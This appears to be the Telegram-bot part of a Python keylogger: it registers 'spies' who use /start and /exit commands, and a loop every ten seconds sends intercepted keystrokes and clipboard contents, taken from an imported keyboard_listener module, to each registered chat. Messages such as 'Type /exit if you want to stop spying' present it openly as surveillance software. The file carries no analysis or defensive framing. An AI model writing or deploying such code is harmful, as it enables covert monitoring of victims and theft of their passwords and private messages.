import telebot
from telebot import types
from telebot.util import smart_split
from user_db import UserDb
from keyboard_listener import get_types, get_copies
from time import sleep
import string


class Bot:
    def __init__(self, token: str, db_name: str):
        self.client = telebot.TeleBot(token)
        self.setup_handlers()
        self.db_name = db_name

    def setup_handlers(self):
        @self.client.message_handler(commands=['start'])
        def start_message(message):
            self.client.send_message(
                message.chat.id,
                "Tracking has been started successfully.\n"
                "Type /exit if you want to stop spying."
            )
            UserDb(self.db_name).add_user(message.chat.id)

        @self.client.message_handler(commands=['exit'])
        def full_exit(message):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(text='Yes', callback_data='full_exit'))
            markup.add(types.InlineKeyboardButton(text='No', callback_data='do_not_exit'))

            self.client.send_message(
                message.chat.id,
                "Are you sure you want to stop spying?",
                reply_markup=markup
            )

        @self.client.callback_query_handler(func=lambda call: True)
        def answer(call):
            if call.data == 'full_exit':
                UserDb(self.db_name).delete_user(call.message.chat.id)
                self.client.send_message(call.message.chat.id, 'Stopped successfully.')
            elif call.data == 'do_not_exit':
                self.client.send_message(call.message.chat.id, 'Nothing changed.')

    def start(self):
        self.client.polling()


def send_data_to_spy(bot_instance, user_id: int, intercepted: dict) -> None:
    for data_type in intercepted:
        if intercepted[data_type]:
            chunks = smart_split(intercepted[data_type], 2048)
            for chunk in chunks:
                if any(c not in string.whitespace for c in chunk):
                    bot_instance.client.send_message(user_id, chunk)


def send_data_to_spies(bot_instance):
    intercepted_data = {
        'typed': get_types(),
        'copied': get_copies()
    }

    db = UserDb(bot_instance.db_name)
    user_ids = db.get_users()
    for user_id in user_ids:
        send_data_to_spy(bot_instance, user_id, intercepted_data)


def data_sender_loop(bot_instance):
    while True:
        send_data_to_spies(bot_instance)
        sleep(10)
